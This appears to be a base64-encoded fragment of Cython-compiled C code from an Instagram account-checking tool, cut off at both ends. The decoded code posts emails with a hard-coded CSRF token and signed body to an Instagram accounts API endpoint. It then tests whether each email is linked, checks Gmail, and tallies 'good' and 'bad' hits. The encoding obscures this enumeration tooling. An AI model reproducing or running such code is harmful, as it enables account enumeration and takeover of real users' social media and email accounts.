BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNTUsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgfQogIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzU1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICBfX3B5eF92X3V1aSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNyk7CiAgX19weXhfdF83ID0gMDsKCiAgCiAgX19weXhfdF83ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzNTcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfVXNlcl9BZ2VudCwgX19weXhfdl91YSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNTcsIF9fcHl4X0wxX2Vycm9yKQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Db29raWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfbWlkX1pWZkd2Z0FCQUFHb1FxYTdBWTNtZ29ZQlYxblApIDwgKDApKSBfX1BZWF9FUlIoMCwgMzU3LCBfX3B5eF9MMV9lcnJvcikKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0NvbnRlbnRfVHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZV8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM1NywgX19weXhfTDFfZXJyb3IpCiAgX19weXhfdl9oZWFkZXJzID0gKChQeU9iamVjdCopX19weXhfdF83KTsKICBfX3B5eF90XzcgPSAwOwoKICAKICBfX3B5eF90XzcgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM2MiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19weXhfdF8yID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pzb24pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzNjIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZHVtcHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzNjIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoNSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM2MywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NzcmZ0b2tlbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV85eTNONWtMcXppYWxRQTd6OTZBTWl5QUtMTUJXcHFWaikgPCAoMCkpIF9fUFlYX0VSUigwLCAzNjMsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWRpZCwgX19weXhfdl91dWkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzYzLCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2d1aWQsIF9fcHl4X3ZfdXVpKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM2MywgX19weXhfTDFfZXJyb3IpCgogIAogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kZXZpY2VfaWQsIF9fcHl4X3ZfZGV2aWNlX2lkKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM2MywgX19weXhfTDFfZXJyb3IpCgogIAogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9xdWVyeSwgX19weXhfdl9lbWFpbCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNjMsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X3RfNCA9IDE7CiAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzYpKSkgewogICAgX19weXhfdF8yID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF82KTsKICAgIGFzc2VydChfX3B5eF90XzIpOwogICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzYpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF82LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgX19weXhfdF80ID0gMDsKICB9CiAgI2VuZGlmCiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfdF8zfTsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMi1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNjIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgfQoKICAKICBfX3B5eF90XzYgPSBQeU51bWJlcl9BZGQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8wZDA2N2MyZjg2Y2FjMmMxN2Q2NTU2MzFjOWNlYzI0MF8yLCBfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzNjIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zaWduZWRfYm9keSwgX19weXhfdF82KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM2MiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lnX3NpZ19rZXlfdmVyc2lvbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV80KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM2MiwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfdl9kYXRhID0gKChQeU9iamVjdCopX19weXhfdF83KTsKICBfX3B5eF90XzcgPSAwOwoKICAKICBfX3B5eF90XzYgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNzEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcG9zdCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM3MSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CgogIAogIF9fcHl4X3RfNCA9IDE7CiAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzMpKSkgewogICAgX19weXhfdF82ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8zKTsKICAgIGFzc2VydChfX3B5eF90XzYpOwogICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzMpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8zLCBfX3B5eF9fZnVuY3Rpb24pOwogICAgX19weXhfdF80ID0gMDsKICB9CiAgI2VuZGlmCiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDIgOiAwKV0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2lfaW5zdGFncmFtX2NvbV9hcGlfdjFfYWNjfTsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMik7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM3MSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X3ZfaGVhZGVycywgX19weXhfdF8xLCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM3MSwgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfMSwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNzEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19weXhfdF83ID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKF9fcHl4X3RfMywgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMi1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpLCBfX3B5eF90XzEpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM3MSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICB9CiAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXh0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzcyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICBfX3B5eF92X3Jlc3BvbnNlID0gX19weXhfdF8zOwogIF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMTEgPSAoX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKF9fcHl4X3ZfZW1haWwsIF9fcHl4X3ZfcmVzcG9uc2UsIFB5X0VRKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF8xMSA8IDApKSkgX19QWVhfRVJSKDAsIDM3NCwgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fcHl4X3RfMTEpIHsKCiAgICAKICAgIF9fcHl4X3RfNyA9IE5VTEw7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dtYWlsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzc1LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgX19weXhfdF80ID0gMTsKICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzEpKSkgewogICAgICBfX3B5eF90XzcgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzEpOwogICAgICBhc3NlcnQoX19weXhfdF83KTsKICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xLCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX3B5eF90XzQgPSAwOwogICAgfQogICAgI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzcsIF9fcHl4X3ZfZW1haWx9OwogICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM3NSwgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgfQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogICAgCiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2RpZyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM3NywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5TG9uZ19BZGRPYmpDKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEsIDEsIDEsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNzcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ29vZGlnLCBfX3B5eF90XzEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzc3LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwoKICAgIAogICAgX19weXhfdF8zID0gTlVMTDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHBwcCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM3OCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgIF9fcHl4X3RfNCA9IDE7CiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHsKICAgICAgX19weXhfdF8zID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF83KTsKICAgICAgYXNzZXJ0KF9fcHl4X3RfMyk7CiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMyk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF80ID0gMDsKICAgIH0KICAgICNlbmRpZgogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8zLCBOVUxMfTsKICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgxLV9fcHl4X3RfNCkgfCAoX19weXhfdF80Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNzgsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgIH0KICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwoKICAgIAogICAgZ290byBfX3B5eF9MMzsKICB9CgogIAogICB7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZGluc3RhKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzgwLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgX19weXhfdF83ID0gX19QeXhfUHlMb25nX0FkZE9iakMoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgMSwgMSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDM4MCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRpbnN0YSwgX19weXhfdF83KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM4MCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKCiAgICAKICAgIF9fcHl4X3RfMSA9IE5VTEw7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3BwcHApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzODEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICBfX3B5eF90XzQgPSAxOwogICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMykpKSB7CiAgICAgIF9fcHl4X3RfMSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMyk7CiAgICAgIGFzc2VydChfX3B5eF90XzEpOwogICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMyk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzMsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fcHl4X3RfNCA9IDA7CiAgICB9CiAgICAjZW5kaWYKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMSwgTlVMTH07CiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMywgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMS1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzgxLCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICB9CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICB9CiAgX19weXhfTDM6OwoKICAKCiAgCiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICBnb3RvIF9fcHl4X0wwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZS5jaGVja19vbiIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fcHl4X3IgPSBOVUxMOwogIF9fcHl4X0wwOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdWEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9kZXYpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9kZXZpY2VfaWQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl91dWkpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9oZWFkZXJzKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZGF0YSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3Jlc3BvbnNlKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ybmVfMTdyYW5kX2lkcyhQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKTsgCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJuZV8xN3JhbmRfaWRzID0geyJyYW5kX2lkcyIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMm5lXzE3cmFuZF9pZHMsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm5lXzE3cmFuZF9pZHMoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCikgewogIFB5T2JqZWN0ICpfX3B5eF92X2JiayA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3ZfSWRvID0gMDsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzOwogICNlbmRp